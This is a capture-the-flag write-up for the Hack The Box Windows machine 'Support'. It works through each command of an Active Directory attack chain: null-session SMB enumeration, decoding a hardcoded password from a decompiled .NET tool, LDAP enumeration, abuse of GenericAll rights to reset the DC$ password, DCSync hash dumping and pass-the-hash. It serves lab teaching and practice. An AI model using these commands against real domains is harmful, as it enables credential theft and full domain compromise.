# HTB Support — Full Writeup

## Overview

Support is an **Easy**-rated Windows Active Directory machine on Hack The Box. The attack chain involves: an SMB share containing a custom tool → reverse engineering to recover an LDAP service account password → LDAP enumeration revealing a plaintext password in a user's info field → abusing GenericAll rights on the DC computer object via the `Shared Support Accounts` group → resetting `DC$`'s password → DCSync to obtain the Administrator hash.

## 1. Enumeration

```bash
nmap $IP -p- --open -sV -sC
```

Open ports are typical for an AD DC: 53 (DNS), 88 (Kerberos), 135/445 (RPC/SMB), 389/636 (LDAP/LDAPS), 5985 (WinRM). Domain: `support.htb`.

## 2. Anonymous SMB Enumeration

```bash
netexec smb $IP -u '' -p ''
```

`netexec` (formerly CrackMapExec) is a swiss-army-knife tool for testing credentials and enumerating SMB/LDAP/WinRM across hosts. An empty username/password tests for a "null session".

```bash
netexec smb $IP -u 'guest' -p '' --shares
```

The `--shares` flag lists SMB shares accessible after authentication. Even with the Guest account disabled, some servers allow share enumeration over an anonymous connection.

Result: a custom share named `support-tools` was found (READ access).

## 3. Pulling a Tool from the SMB Share

```bash
smbclient //$IP/support-tools -N
```

`-N` connects with a null session (empty credentials). Inside is `UserInfo.exe.zip`:

```
get UserInfo.exe.zip
```

(`get` downloads the file from the SMB share to the local machine)

## 4. .NET Decompilation

```bash
unzip UserInfo.exe.zip
strings UserInfo.exe | grep -iE "pass|password|user|admin|token|key|ldap|sql|connection"
```

`strings` extracts readable text from a binary. Names like `enc_password` and `getPassword` suggest a hardcoded encrypted credential inside this .NET assembly.

```bash
ilspycmd UserInfo.exe -o decompiled/
```

`ilspycmd` is a .NET decompiler that converts IL/C# assemblies back into readable C# source. Install via `dotnet tool install -g ilspycmd`.

The decompiled code reveals a `Protected` class:

```csharp
private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
private static byte[] key = Encoding.ASCII.GetBytes("armando");

public static string getPassword()
{
    byte[] array = Convert.FromBase64String(enc_password);
    for (int i = 0; i < array.Length; i++)
        array[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDF);
    return Encoding.Default.GetString(array);
}
```

## 5. Decoding the Password

We replicate the algorithm in Python (Base64 decode → XOR each byte with the repeating key, then XOR with `0xDF`):

```python
import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"

data = base64.b64decode(enc_password)
result = bytes((b ^ key[i % len(key)]) ^ 0xDF for i, b in enumerate(data))
print(result.decode())
```

**Result:** `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz` — the password for the `support\ldap` service account (as seen in the code: `DirectoryEntry("LDAP://support.htb", "support\\ldap", password)`).

## 6. Authenticating to LDAP

```bash
netexec ldap $IP -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb
```

The bind succeeds, allowing further LDAP queries with this account.

## 7. BloodHound Data Collection

```bash
bloodhound-python -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb -ns $IP -c All
```

`bloodhound-python` collects users, groups, computers, and ACL relationships from AD and exports them as JSON for visualization in BloodHound. `-ns` specifies the name server (the DC's IP), and `-c All` enables all collection methods (sessions, ACLs, group memberships, etc.).

## 8. Finding the `support` User

We query the `info` attribute for each user — this is the "Notes" field in the GUI, where admins sometimes leave credentials by mistake:

```bash
ldapsearch -x -H ldap://$IP -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" "(sAMAccountName=support)"
```

The result reveals `info: Ironside47pleasure40Watchful` — the password for the `support` account, which is a member of `Remote Management Users` (meaning WinRM access is possible).

## 9. Foothold via Evil-WinRM

```bash
evil-winrm -i support.htb -u 'support' -p 'Ironside47pleasure40Watchful'
```

`evil-winrm` opens an interactive PowerShell session over Windows Remote Management (port 5985). `-i` is the target host, `-u`/`-p` are the credentials.

```powershell
type C:\Users\support\Desktop\user.txt
```

→ **User flag** obtained.

## 10. Privilege Escalation — Controlling the DC$ Account

```powershell
whoami /all
```

The `support` user belongs to `SUPPORT\Shared Support Accounts`. BloodHound analysis shows this group has **GenericAll** rights over the DC's computer object — meaning it can modify nearly any attribute of that object, including its password.

```powershell
Get-ADComputer -LDAPFilter "(dNSHostName=dc.support.htb)" -Properties sAMAccountName,distinguishedName,servicePrincipalName,userAccountControl
```

This confirms the DC's computer account is named `DC$`.

```powershell
Set-ADAccountPassword -Identity 'DC$' -Reset -NewPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)
```

`Set-ADAccountPassword` is the PowerShell cmdlet for resetting a domain account's password (`Set-LocalUser` only works on local accounts, not domain computer objects — hence the earlier failure). Thanks to GenericAll, we successfully reset `DC$`'s password to `NewPass123!`.

## 11. DCSync — Dumping the Domain Admin Hash

```bash
secretsdump.py 'support.htb/DC$:NewPass123!'@$IP -just-dc-user Administrator
```

`secretsdump.py` (from impacket) extracts password hashes from a domain controller's NTDS.DIT database. This uses the **DCSync** technique — since DC computer accounts inherently have replication rights, authenticating as `DC$` lets us call `DrsGetNCChanges` via the MS-DRSR (DRSUAPI) protocol and retrieve the Administrator's credential data as if replicating it to ourselves.

- `-just-dc-user Administrator` — only dump this specific account, not the entire domain

**Result:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26:::
```

Format: `username:RID:LM-hash:NTLM-hash:::`

## 12. Pass-the-Hash as Administrator

```bash
evil-winrm -i support.htb -u 'support.htb\Administrator' -H 'bb06cbc02b39abeddd1335bc30b19e26'
```

`-H` authenticates using an NTLM hash instead of a plaintext password (Pass-the-Hash). NTLM authentication accepts the hash directly, so the plaintext password is never needed.

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

→ **Root flag** obtained. Full domain compromise achieved.

## Glossary

| Term | Description |
|---|---|
| **null session** | Anonymous SMB/LDAP connection using empty credentials |
| **GenericAll/GenericWrite** | AD ACL permission granting full/partial control over an object's attributes |
| **DCSync** | Abusing replication rights to extract domain credential hashes |
| **Pass-the-Hash (PtH)** | Authenticating with an NTLM hash instead of a plaintext password |
| **-D / -b / -w (ldapsearch)** | Bind DN / Search Base / Bind Password |
| **-H (evil-winrm/secretsdump)** | NTLM hash authentication flag |

---
